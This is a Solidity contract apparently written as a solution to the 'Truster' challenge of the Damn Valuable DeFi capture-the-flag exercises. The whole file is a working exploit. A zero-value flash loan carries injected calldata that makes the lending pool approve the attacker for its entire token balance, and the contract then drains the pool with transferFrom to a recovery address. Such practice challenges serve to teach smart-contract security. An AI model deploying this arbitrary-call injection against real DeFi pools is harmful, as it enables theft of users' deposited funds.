// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterAttack{
    
    DamnValuableToken public token;
    TrusterLenderPool public pool;
    address public recovery;

    constructor(address tokenAddress, address poolAddress, address recoveryAddress){
        token = DamnValuableToken(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
        recovery = recoveryAddress;
    }

    function exploit() external returns(bool){
        
        uint amount = token.balanceOf(address(pool));
        require(
            pool.flashLoan(
                0,
                address(this),
                address(token),
                abi.encodeWithSignature("approve(address,uint256)", address(this), amount)
                )
            );

        require(token.transferFrom(address(pool), address(this), amount));
        require(token.transfer(recovery, amount));

        return true;
    }
}